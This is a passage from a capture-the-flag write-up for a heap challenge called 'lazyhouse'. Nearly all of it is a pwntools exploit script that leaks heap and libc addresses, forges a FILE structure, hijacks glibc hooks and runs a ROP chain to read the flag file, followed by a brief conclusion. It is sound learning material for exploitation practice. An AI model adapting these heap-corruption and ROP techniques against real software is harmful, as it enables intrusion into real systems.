buy_house(1, 0x1c0, 'B' * 128 + p64(0) + p64(0x21) + p64(0) * 3 + p64(0x71) + 'B' * 0x60 + p64(0) + p64(0x31) + p64(0) * 5 + p64(0x61) + 'B' * 0x50 + p64(0) + p64(0x4c1))
sell_house(2)
sell_house(3)
sell_house(5)
data_buffer = show_house(1)
heap_leak = u64(data_buffer[0x9e:0x9e+8])
libc_leak = u64(data_buffer[0x1b6:0x1b6+8])
heap_base = heap_leak - 0x10
libc_base = libc_leak - 0x1e4ca0
libc.address = libc_base
log.info('heap base @ ' + hex(heap_base))
log.info('libc base @ ' + hex(libc_base))
log.info('lbic leak @ ' + hex(libc_leak))
first_chunk = heap_base + 0x1bd0
second_chunk = heap_base + 0x1c50
third_chunk = heap_base + 0x40
fourth_chunk = heap_base + 0x1b40
update_house(1, '/home/lazyhouse/flag\0'.ljust(144,"B") + p64(0) + p64(0x21) + p64(second_chunk) + p64(third_chunk) + p64(0x20) + p64(0x70) + 'B' * 0x60 + p64(0) + p64(0x31) + p64(third_chunk) + p64(libc_leak) + p64(0) * 2 + p64(0x30) + p64(0x60) + 'B' * 0x40 + p64(0) + p64(0x4c1) + p64(libc_leak) + p64(fourth_chunk))
pivot_addr = libc_base + 0x43db4
pivot_addr = libc_base + 0x832f0
malloc_hook = libc_base + 0x1e4c30
free_hook = libc_base + 0x1e75a8
# __malloc_hook
fake = fit({
    0x0: 0x800,
    0x10: libc.symbols['environ'],
    0x20: libc.symbols['environ'],
    0x28: libc.symbols['environ']+8,
    0x38: libc.symbols['__malloc_hook'],
    0x40: libc.symbols['__malloc_hook']+8,
    0xc0: p32(0xffffffff),
    0xd8: libc.symbols['_IO_file_jumps']
    }, filler="\0")
fake = fake.ljust(0x100,'\0')
buy_house(2, 0x2f0, fake + p64(libc.symbols['__free_hook']), True)
buy_super_house(p64(libc.symbols['__uflow']).ljust(0x217,"A"))
sell_house(2)
p.recvuntil("Your choice: Index:")
p.recvuntil("Your choice: Index:")
stack = u64(p.recvn(8))-0x290
log.info("STACK: "+hex(stack))
p.send(p64(libc.symbols['gets']))
flagstr = heap_base+0x1ab0
rdi = libc.address+0x26542
rsi = libc.address+0x26f9e
rdx = libc.address+0x12bda6
rax = libc.address+0x47cf8
syscall = libc.address+0xcf6c5
xchg_eax_edi = libc.address+0x145585
rop = flat(rdi, flagstr, rsi, 0, rax, 2, syscall)
rop += flat(xchg_eax_edi, rsi, heap_base, rdx, 0x100, libc.symbols['read'])
rop += flat(rdi, 1, rsi, heap_base, rdx, 0x100, libc.symbols['write'])
buy_house(2, stack, rop+'\n', True)
p.interactive()
```

# Conclusion

This was a very fun challenge, and I ended up learning a lot about how both the unsorted bin and tcache both worked.  Thanks to Angelboy for, as usual, a great heap challenge!